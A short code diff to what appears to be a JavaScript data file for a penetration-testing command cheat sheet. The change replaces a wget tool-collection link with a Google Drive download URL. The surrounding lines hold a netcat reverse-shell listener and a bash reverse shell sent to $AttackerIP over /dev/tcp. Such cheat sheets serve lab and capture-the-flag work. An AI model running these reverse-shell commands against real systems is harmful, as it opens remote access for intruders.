@@ -18,7 +18,7 @@ const commandsData = [
             {
                 category: "Useful Commands",
                 commands: [
-                    { title: "My Tool Collection", description: "Just my own Tool Collection. Might update once in a while", template: "wget https://arimono.github.io/Snippet/assets/Tools.tar" },
+                    { title: "My Tool Collection", description: "Just my own Tool Collection. Might update once in a while", template: "https://drive.usercontent.google.com/download?id=1T00NujmQEiW42V7LBa7Sfo7jwemeBztK&export=download&authuser=0" },
                     { title: "Reverse Shell Listener", description: "Sets up a listener on your attacker machine to catch an incoming reverse shell.", template: "rlwrap nc -nlvp $Port" },
                     { title: "Simple Bash Reverse Shell", description: "Execute this on the victim machine to send a shell back to your listener.", template: "bash -c 'bash -i >& /dev/tcp/$AttackerIP/$Port 0>&1'" },
                     { title: "Python Server", description: "To share files in simple way.", template: "python3 -m http.server 8000" },
